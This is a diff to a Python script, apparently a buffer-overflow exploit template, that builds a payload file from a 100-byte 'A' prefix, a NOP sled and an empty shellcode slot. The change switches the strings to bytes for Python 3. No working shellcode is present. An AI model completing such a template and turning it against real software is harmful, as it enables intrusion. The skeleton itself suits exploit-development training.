@@ -10,14 +10,14 @@ maxlen = 5000
 crash_reg = 100
 
 # Shellcode
-shellcode = ""
+shellcode = b""
 
 # Filling and nopping
-nopchar = "\x90"
-prefiller = "A"
+nopchar = b"\x90"
+prefiller = b"A"
 prenop = nopchar * 200
 postnop = nopchar * 16
-postfiller = "C"
+postfiller = b"C"
 
 # Prefix
 prefix = prefiller * crash_reg
@@ -31,7 +31,7 @@ payload = prefix + suffix
 
 try:
     file = open(filename,"wb")
-    file.write(payload.encode())
+    file.write(payload)
     file.close()
     print("[+] File " + filename + " with size " + str(len(payload)) + " created successfully")
 except Exception as e:
